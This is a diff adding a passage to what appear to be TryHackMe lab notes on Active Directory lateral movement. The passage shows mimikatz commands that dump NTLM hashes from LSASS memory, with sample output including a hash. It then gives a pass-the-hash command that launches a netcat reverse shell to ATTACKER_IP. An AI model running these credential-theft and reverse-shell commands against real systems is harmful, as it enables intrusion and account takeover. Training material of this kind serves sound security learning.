@@ -203,3 +203,32 @@ User : Administrator
 
 - Extracting NTLM hashes from LSASS memory:  
     This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
+```
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # sekurlsa::msv 
+Authentication Id : 0 ; 308124 (00000000:0004b39c)
+Session           : RemoteInteractive from 2 
+User Name         : bob.jenkins
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 2022/04/22 09:55:02
+SID               : S-1-5-21-3330634377-1326264276-632209373-4605
+        msv :
+         [00000003] Primary
+         * Username : bob.jenkins
+         * Domain   : ZA
+         * NTLM     : 6b4a57f67805a663c818106dc0648484
+```  
+
+We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:  
+```
+user@AttackBox$ nc -lvp 5555
+```
+```
+mimikatz # token::revert
+mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
+```
+
+
